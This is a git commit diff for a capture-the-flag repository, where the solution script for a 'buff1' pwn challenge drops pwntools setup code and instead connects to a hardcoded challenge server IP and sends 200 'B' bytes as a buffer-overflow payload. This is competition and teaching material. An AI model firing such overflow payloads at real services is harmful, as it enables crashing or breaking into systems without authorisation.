e1f3b063add214ce5e6c6d08d0925fd7179a63b1
geo-lit <geolit111999@gmail.com>
2022-05-02 18:37:49 -0400

    finished css, added buff1 solution

--- challenges/pwn/buff1/sol.py
+++ challenges/pwn/buff1/sol.py
@@ -2,22 +2,7 @@
 
 from pwn import *
 
-context.terminal = ['konsole','-e'] # replace this with your terminal of choice
-#context.log_level = 'debug'
-context.binary = './build/AAAAAAAAAAAAAAAA'
-
-e = ELF('./build/AAAAAAAAAAAAAAAA')
-rop = ROP('./build/AAAAAAAAAAAAAAAA')
-if 'd' in sys.argv:
-    p = e.debug()
-elif 'r' in sys.argv:
-    p = remote('localhost', 5000)
-elif 's' in sys.argv:
-    s = ssh(host='host', user='username', password='password')
-    p = s.process('./build/AAAAAAAAAAAAAAAA', cwd='problemDir')
-else:
-    p = e.process()
-
+p = remote('34.150.138.102', 5000)
 payload = b'B' * 200
 
 p.sendline(payload)
